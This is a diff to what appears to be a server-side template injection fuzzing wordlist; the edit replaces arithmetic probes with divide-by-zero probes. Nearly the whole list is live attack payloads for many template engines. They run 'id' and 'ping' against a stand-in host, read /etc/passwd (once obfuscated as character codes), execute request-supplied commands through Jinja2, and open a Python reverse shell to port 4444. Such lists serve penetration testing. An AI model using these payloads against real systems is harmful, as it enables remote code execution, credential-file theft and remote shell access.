@@ -1,12 +1,8 @@
-
 "-->'-->`--><!--#set var="suc" value="rtb97y3o64"--><!--#set var="uwe" value="tvdb905q86"--><!--#echo var="suc"--><!--#echo var="uwe"--><!--#exec cmd="id" -->
 #set($x=77*77)${x}
-#{ 3 * 3 }
 #{ 7 * 7 }
-#{''.constructor.constructor('return Error().stack')()}
-#{3*3}
-#{42*42}
-#{7*7}
+#{ 7 / 0 }
+#{''.constructor.constructor('return Error().stack')()
 #{77*77}
 #{Thread.current.backtrace}
 #{__import__("traceback").format_stack()}
@@ -16,11 +12,6 @@ $class.inspect("java.lang.Runtime").type.getRuntime().exec("ping vps_ip")
 ${"freemarker.template.utility.Execute"?new()("id")}
 ${#ctx.getClass()}
 ${''.constructor.constructor('return Error().stack')()}
-${3*3}
-${42*42}
-${5*1111}
-${6*6}
-${7*7}
 ${7/0}
 ${77*77}
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
@@ -89,19 +80,16 @@ ${self.template.module.runtime.util.compat.inspect.os.system("id")}
 ${self.template.module.runtime.util.os.system("id")}
 ${self}
 ${xyz|77*77}
-${{3*3}}
-${{7*7}}
 ${{77*77}}
 ${{<%[%'"}}%\
 %25{self}
 %{self}
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 1111*7
-42*42
+7/0
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
 <#assign xy="zxxxxxxz"><#assign yx="zyyyyyyz">${yx}${xy}
-<%= 3 * 3 %>
 <%= 7 * 7 %>
 <%= 7*7 %>
 <%= 7/0 %>
@@ -111,22 +99,22 @@ ${{<%[%'"}}%\
 <%= system("ping domain_collab") %>
 <%= system("ping vps_ip") %>
 <%=''.constructor.constructor('return Error().stack')()%>
-<%=42*42 %>
 <%=77*77%>
 <%=Thread.current.backtrace%>
 <%__import__("traceback").format_stack()%>
 <p th:text='${#ctx.getClass()}'></p>
 <pre>{% debug %}</pre>
-@(1+2)
-@(6+5)
+@(7/0)
 @(77*77)
 @(System.Diagnostics.Process.Start("cmd.exe","/c ping domain_collab"));
 @(System.Diagnostics.Process.Start("cmd.exe","/c ping vps_ip"));
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
 [7*7]
-[[${42*42}]]
+[7/0]
+[=7/0]
 [[${77*77}]]
+[[${77/0}]]
 [[77*77]]
 ``
 {"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}
@@ -139,7 +127,7 @@ ${{<%[%'"}}%\
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
 {%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Sized'%}{{c.__len__.__globals__['__builtins__']['__import__']('traceback').format_stack()}}{%endif%}{%endfor%}
-{42*42}
+{7/0}
 {77*77}
 {^xyzm42}1764{/xyzm42}
 {php}echo `id`;{/php}
@@ -169,9 +157,7 @@ ${{<%[%'"}}%\
 {{3*'3'}}
 {{3*3}}
 {{4*4}}[[5*5]]
-{{42*42}}
 {{7*'7'}}
-{{7*7}}
 {{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}${{<%[%'"}}%\
 {{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}%asset_name%
 {{7/0}}
@@ -209,7 +195,6 @@ ${{<%[%'"}}%\
 {{self._TemplateReference__context.joiner.__init__.__globals__.os}}
 {{self._TemplateReference__context.namespace.__init__.__globals__.os}}
 {{self}}
-{{{42*42}}}
 {{{77*77}}}
 }}{% import os %}{{os.system('ping domain_collab')
 }}{% import os %}{{os.system('ping vps_ip')
